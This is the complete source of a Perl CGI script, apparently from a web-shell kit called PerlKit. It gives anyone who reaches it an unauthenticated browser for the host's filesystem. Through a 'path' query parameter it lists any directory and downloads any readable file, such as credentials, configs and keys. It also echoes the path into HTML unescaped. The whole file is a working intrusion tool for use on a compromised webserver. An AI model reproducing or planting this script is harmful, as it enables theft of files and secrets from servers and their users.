#!/usr/bin/perl
#
# PerlKit-0.1 - http://www.t0s.org
#
# browse.pl: Browse and download files from a webserver

use strict;

my ($path, %FORM);

$|=1;


# Get parameters

%FORM = parse_parameters($ENV{'QUERY_STRING'});

if(defined $FORM{'path'}) {
  $path = $FORM{'path'};


} else {
  $path = "/";
}

if(-f $path) { # Download selected file
  print "Content-Type: application/octet-stream\r\n";
  print "\r\n";
  open(FILE, "< $path") || print "Could not open file\n";

  while(<FILE>) {
    print;
  }

  close(FILE);
  exit;
}

print "Content-Type: text/html\r\n";
print "\r\n";

print '<HTML>
<body>
<form action="" method="GET">
<input type="text" name="path" size=45 value="' . $path . '">
<input type="submit" value="List">
</form>
Directory ' . $path . ' contents:
<p>
<font face="courier">
<table>';

if(defined $FORM{'path'}) {

  opendir(DIR, $path) || print "Could not open directory";

  foreach (sort(readdir(DIR))) {
    print get_fileinfo($path, $_). "\n";
  }

  closedir(DIR);
  
}

print "</table></font>";

sub parse_parameters ($) {
  my %ret;

  my $input = shift;

  foreach my $pair (split('&', $input)) {
    my ($var, $value) = split('=', $pair, 2);

    if($var) {
      $value =~ s/\+/ /g ;
      $value =~ s/%(..)/pack('c',hex($1))/eg;

      $ret{$var} = $value;
    }
  }

  return %ret;
}

sub get_fileinfo ($$) {
  my $ret;

  my ($dir,$filename) = @_;
  my $file = $dir . "/" . $filename;

  $file=~s/\/+/\//g;

  $ret = "<tr>";

  $ret .= "<td>";

  if(-d $file) {
    $file=~s/\/[^\/]+\/\.\./\//g;
    $ret .= "<a href=\"?path=$file\">$filename</a>";
  } else {
    $ret .= "$filename <a href=\"?path=$file\">[D]</a>" ;
  }
  $ret .= "</td>";

  my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size, $atime,$mtime,$ctime,$blksize,$blocks) = stat($file);

  $ret .= "<td width=30'>&nbsp;</td>";
  $ret .= "<td>$size</td>";
  $ret .= "<td>". getpwuid($uid) ."</td>";
  $ret .= "<td>". getgrgid($gid) ."</td>";

  $ret .= "</tr>";

  return $ret;
}
